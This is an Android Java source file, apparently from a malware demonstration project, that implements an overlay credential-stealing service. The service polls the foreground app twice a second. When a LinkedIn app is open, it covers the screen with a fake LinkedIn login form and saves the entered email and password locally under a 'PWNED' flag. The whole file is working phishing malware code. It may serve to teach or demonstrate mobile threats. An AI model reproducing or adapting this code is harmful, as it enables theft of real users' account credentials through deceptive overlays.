package app.mordred.androidmalwaredemo;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.res.Configuration;
import android.graphics.PixelFormat;
import android.os.Handler;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;

import com.rvalerio.fgchecker.AppChecker;

import java.util.Timer;
import java.util.TimerTask;

import androidx.localbroadcastmanager.content.LocalBroadcastManager;


public class AttackService extends Service {

    private static final String TAG = "AttackService";

    public static final String ACTION_PING = AttackService.class.getName() + ".PING";
    public static final String ACTION_PONG = AttackService.class.getName() + ".PONG";


    private Timer timer;
    private TargetAppTimerTask checkTargetAppTask;
    public AppChecker appChecker;
    private Handler handler;
    public WindowManager windowManager;
    public SharedPreferences.Editor sharedPreferencesEdit;
    private boolean showingFakeLogin = false;
    private View mainView;
    private WindowManager.LayoutParams params;
    private boolean isPwned = false;

    private void runOnUiThread(Runnable runnable) {
        handler.post(runnable);
    }

    @Override
    public IBinder onBind(Intent i) {
        return null;
    }

    public void checkTargetApp() {
        timer = new Timer();
        checkTargetAppTask = new TargetAppTimerTask();
        timer.schedule(checkTargetAppTask, 0, 500);
    }

    class TargetAppTimerTask extends TimerTask {

        public TargetAppTimerTask() {
            super();
        }

        @Override
        public void run() {
            String packageName = appChecker.getForegroundApp(getBaseContext());
            Log.e(TAG, "Current foreground app: " + packageName);

            // inject view based on packaganame
            if (packageName.startsWith("com.linkedin") && !isPwned) {
                injectView();
            } else {
                removeView();
            }
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler();
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        sharedPreferencesEdit = PreferenceManager.getDefaultSharedPreferences(getBaseContext()).edit();
        appChecker = new AppChecker();
        checkTargetApp();

        params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                0,
                PixelFormat.TRANSLUCENT);

        LayoutInflater li = (LayoutInflater) getSystemService(LAYOUT_INFLATER_SERVICE);

        mainView = li.inflate(R.layout.linkedin_fake_login, null);

        if (mainView == null) {
            return;
        }

        final EditText edxMail = mainView.findViewById(R.id.email);
        final EditText edxPwd = mainView.findViewById(R.id.pwd);

        Button submitButton = mainView.findViewById(R.id.submit);

        submitButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                sharedPreferencesEdit.putString("CRED_MAIL", edxMail.getText().toString()).apply();
                sharedPreferencesEdit.putString("CRED_PWD", edxPwd.getText().toString()).apply();
                sharedPreferencesEdit.putBoolean("PWNED", true).apply();
                isPwned = true;
                removeView();
            }
        });
    }

    @Override
    public void onDestroy() {
        LocalBroadcastManager.getInstance(this).unregisterReceiver(mReceiver);
        super.onDestroy();
        stopForeground(true);
    }

    @Override
    public void onConfigurationChanged(Configuration newConfig) {
        super.onConfigurationChanged(newConfig);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        LocalBroadcastManager.getInstance(this).registerReceiver(mReceiver, new IntentFilter(ACTION_PING));
        super.onStartCommand(intent, flags, startId);
        return START_STICKY;
    }

    private void injectView() {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                Log.d(TAG, "Injecting view...");
                if (!showingFakeLogin) {
                    windowManager.addView(mainView, params);
                    showingFakeLogin = true;
                }
            }
        });
    }

    private void removeView() {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                Log.d(TAG, "Removing view...");
                if (showingFakeLogin) {
                    windowManager.removeViewImmediate(mainView);
                    showingFakeLogin = false;
                }
            }
        });
    }

    private BroadcastReceiver mReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive (Context context, Intent intent) {
            if (intent.getAction() != null && intent.getAction().equals(ACTION_PING)) {
                LocalBroadcastManager manager = LocalBroadcastManager.getInstance(getApplicationContext());
                manager.sendBroadcast(new Intent(ACTION_PONG));
            }
        }
    };
}
